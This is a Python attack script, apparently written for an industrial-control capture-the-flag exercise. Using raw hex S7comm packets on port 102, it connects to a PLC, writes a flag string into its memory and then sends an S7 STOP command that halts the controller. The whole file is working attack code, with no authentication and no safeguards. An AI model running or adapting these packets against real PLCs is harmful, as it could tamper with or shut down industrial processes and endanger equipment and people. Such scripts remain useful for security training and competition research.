import socket
import struct
import time
import sys


class Attack_PLC:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def connect_target(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(3)
        self.sock.connect((self.ip, self.port))

    def send(self, data):
        self.sock.send(data)
        hdr = self.sock.recv(4)
        length = struct.unpack('>H', hdr[2:4])[0]
        left = length - 4
        fin_data = b''
        if left > 0:
            recv_data = self.sock.recv(left)
            if not recv_data:
                pass
            else:
                fin_data += recv_data
                left -= len(recv_data)
        return hdr + fin_data

    #  tpkt版本号 cotp pdu链接请求 一次认证
    def cr(self):
        cc_cotp = bytes.fromhex("0300001611e00000002500c1020101c2020101c0010a")
        self.send(cc_cotp)

    # 二次认证
    def s7_tpkt(self):
        s7_setup = bytes.fromhex("0300001902f08032010000ccc100080000f0000001000103c0")
        self.send(s7_setup)

    def write_data(self, hex_char):
        s7_write = bytes.fromhex(hex_char)
        self.send(s7_write)

    def check_attack(self):
        s7_read = bytes.fromhex("0300001f02f080320100000e00000e00000401120a10020001000184000120")
        res = self.send(s7_read)[-1]
        if res != 0:
            return True
        time.sleep(0.2)

    def run_plc(self):
        s7comm_run = bytes.fromhex('0300002502f08032010000003a0014000028000000000000fd000009505f50524f4752414d')
        data = self.send(s7comm_run)

    def stop_plc(self):
        s7comm_stop = bytes.fromhex('0300002102f0803201000000060010000029000000000009505f50524f4752414d')
        self.send(s7comm_stop)

    def close(self):
        self.sock.close()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print('Usage: {} IP_ADDRESS'.format(sys.argv[0]))
        sys.exit(1)
    IP = sys.argv[1]
    target_plc = Attack_PLC(IP, 102)

    target_plc.connect_target()

    target_plc.cr()

    target_plc.s7_tpkt()

    flag_str = "Ly_Flag{e692cfd3}"
    length = hex(len(flag_str) * 8)[2:].zfill(4)
    flag_hex = '4c795f466c61677b65363932636664337d'
    print("===== write data =====")

    # 写入flag
    target_plc.write_data("0300002402f080320100005901000e00050501120a100200010001840001100004"+length+flag_hex)
    print("===== finish =====")
    time.sleep(0.2)
    flag = target_plc.check_attack()
    if flag:
        target_plc.stop_plc()
        time.sleep(0.2)
        print("*** stop plc ***")
        target_plc.close()
        exit(0)
